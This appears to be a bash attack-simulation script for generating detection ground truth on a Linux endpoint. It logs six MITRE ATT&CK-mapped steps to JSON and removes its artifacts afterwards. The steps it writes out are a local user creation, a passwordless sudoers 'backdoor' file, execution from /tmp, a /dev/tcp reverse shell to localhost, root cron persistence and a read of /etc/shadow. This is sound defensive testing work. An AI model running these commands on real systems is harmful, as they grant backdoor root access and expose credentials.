#!/bin/bash
# name: 11-linux_attack_sim.sh
# purpose: Execute a controlled sequence of attacker-like actions on the Linux endpoint and generate ground truth telemetry.
# author: Massimo Rios

set -e
set -u
set -o pipefail

OUTPUT_JSON="linux_attack_log.json"
TEST_USER="testattacker"
SUDOERS_FILE="/etc/sudoers.d/backdoor"
SUSPICIOUS_BIN="/tmp/suspicious_bin"
BEACON_FILE="/tmp/beacon.sh"
CRON_FILE="/etc/cron.d/persistence_test"

REVERSE_SHELL_PID=""

for cmd in date useradd userdel id cp chmod bash timeout cat rm jq python3; do
    if ! command -v "$cmd" >/dev/null 2>&1; then
        echo "[!] Required command not found: $cmd" >&2
        exit 1
    fi
done

cleanup() {
    if [[ -n "${REVERSE_SHELL_PID}" ]]; then
        kill "${REVERSE_SHELL_PID}" 2>/dev/null || true
        wait "${REVERSE_SHELL_PID}" 2>/dev/null || true
    fi

    rm -f "$SUDOERS_FILE" "$SUSPICIOUS_BIN" "$BEACON_FILE" "$CRON_FILE"
    userdel -r "$TEST_USER" >/dev/null 2>&1 || true
}

trap cleanup EXIT

echo "[*] Running Linux attacker simulation..."

run_attack_step() {
    local step_num="$1"
    local description="$2"
    local expected_source="$3"
    local mitre_technique="$4"
    local cmd="$5"

    local timestamp
    timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

    printf "    [%d/6] %-35s %s" "$step_num" "$description..." "$timestamp"

    if eval "$cmd"; then
        echo -e "\033[32m\033[0m"
    else
        echo -e " \033[31m[FAILED]\033[0m"
    fi

    python3 -c '
import json, sys

path = "linux_attack_log.json"
try:
    with open(path, "r") as f:
        data = json.load(f)
except Exception:
    data = {"metadata": {"simulation": "Linux Attacker Simulation"}, "actions": []}

data["actions"].append({
    "action_number": int(sys.argv[1]),
    "description": sys.argv[2],
    "timestamp": sys.argv[3],
    "expected_detection_source": sys.argv[4],
    "mitre_attack_technique": sys.argv[5]
})

with open(path, "w") as f:
    json.dump(data, f, indent=4)
' "$step_num" "$description" "$timestamp" "$expected_source" "$mitre_technique"

    sleep 0.5
}

python3 -c '
import json
with open("linux_attack_log.json", "w") as f:
    json.dump({"metadata": {"simulation": "Linux Attacker Simulation", "total_actions": 6}, "actions": []}, f, indent=4)
'
rm -f "$SUDOERS_FILE" "$SUSPICIOUS_BIN" "$BEACON_FILE" "$CRON_FILE"
userdel -r "$TEST_USER" >/dev/null 2>&1 || true

# Create a user
run_attack_step 1 "Creating user testattacker" "auditd / /var/log/auth.log" "MITRE ATT&CK T1136.001 - Create Account: Local Account" \
    "useradd -m -s /bin/bash $TEST_USER"

# Modify sudoers (with syntax validation via visudo if available)
run_attack_step 2 "Modifying sudoers" "auditd / /etc/sudoers.d/" "MITRE ATT&CK T1098.003 - Account Manipulation: Sudoers File Modification" \
    'printf "testattacker ALL=(ALL) NOPASSWD:ALL\n" > /etc/sudoers.d/backdoor && chmod 0440 /etc/sudoers.d/backdoor && (visudo -cf /etc/sudoers.d/backdoor >/dev/null 2>&1 || true)'

# Execute a binary from /tmp
run_attack_step 3 "Executing from /tmp" "Auditd / Sysmon for Linux" "MITRE ATT&CK T1074.001 - Data Staged: Local Data Staging" \
    'cp /usr/bin/id /tmp/suspicious_bin && chmod 0755 /tmp/suspicious_bin && /tmp/suspicious_bin >/dev/null 2>&1'

# Attempt a reverse shell to localhost (with strict timeout)
run_attack_step 4 "Reverse shell attempt (localhost)" "auditd / Netfilter / Syslog" "MITRE ATT&CK T1059.004 - Command and Scripting Interpreter: Unix Shell" \
    "timeout 2 bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 &' >/dev/null 2>&1 || true"

# Modify crontab persistence
run_attack_step 5 "Cron persistence" "auditd / /etc/cron.d/" "MITRE ATT&CK T1053.003 - Scheduled Task/Job: Cron" \
    'printf "#!/bin/bash\nexit 0\n" > /tmp/beacon.sh && chmod 0755 /tmp/beacon.sh && printf "* * * * * root /tmp/beacon.sh\n" > /etc/cron.d/persistence_test && chmod 0644 /etc/cron.d/persistence_test'

# Access sensitive files
run_attack_step 6 "Accessing /etc/shadow" "auditd / PAM" "MITRE ATT&CK T1003.008 - OS Credential Dumping: /etc/passwd and /etc/shadow" \
    'cat /etc/shadow > /dev/null 2>&1'

echo -n "[*] Cleaning up artifacts..."
rm -f "$SUDOERS_FILE" "$SUSPICIOUS_BIN" "$BEACON_FILE" "$CRON_FILE"
userdel -r "$TEST_USER" >/dev/null 2>&1 || true
echo -e "                           \033[32m[CLEAN]\033[0m"

echo "Actions executed: 6"
echo "Ground truth saved to: $OUTPUT_JSON"
